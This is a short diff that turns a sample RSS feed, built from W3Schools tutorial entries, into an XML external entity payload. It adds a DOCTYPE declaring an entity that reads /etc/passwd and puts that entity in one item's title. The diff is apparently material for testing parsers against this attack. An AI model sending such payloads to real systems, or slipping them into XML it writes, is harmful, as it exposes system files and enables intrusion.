@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE sample [
+        <!ENTITY file SYSTEM "file:///etc/passwd">
+]>
 <rss version="2.0">
-
 <channel>
   <title>W3Schools Home Page</title>
   <link>https://www.w3schools.com</link>
@@ -11,7 +13,7 @@
     <description>New RSS tutorial on W3Schools</description>
   </item>
   <item>
-    <title>XML Tutorial</title>
+    <title>&file;</title>
     <link>https://www.w3schools.com/xml</link>
     <description>New XML tutorial on W3Schools</description>
   </item>
